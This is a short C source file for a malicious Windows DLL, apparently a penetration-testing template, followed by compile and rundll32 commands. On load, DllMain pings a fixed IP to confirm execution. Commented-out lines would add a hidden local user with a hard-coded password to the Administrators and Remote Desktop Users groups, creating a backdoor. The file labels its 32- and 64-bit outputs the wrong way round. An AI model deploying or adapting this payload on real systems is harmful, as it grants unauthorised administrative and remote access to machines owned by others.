#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /c ping -n 1 192.168.100.17");
//        WinExec("net user /add h4rithd Passw0rd123", 0);
//        WinExec("net localgroup administrators h4rithd  /add", 0);
//        WinExec("net localgroup \"Remote Desktop Users\" h4rithd  /add", 0);
        ExitProcess(0);
    }
    return TRUE;
}

// [x64 compile]: x86_64-w64-mingw32-gcc DllMain.c -shared -o DllMain32.dll
// [x86 compile]: i686-w64-mingw32-gcc DllMain.c -shared -o DllMain64.dll
// rundll32 DllMain64.dll,DllMain
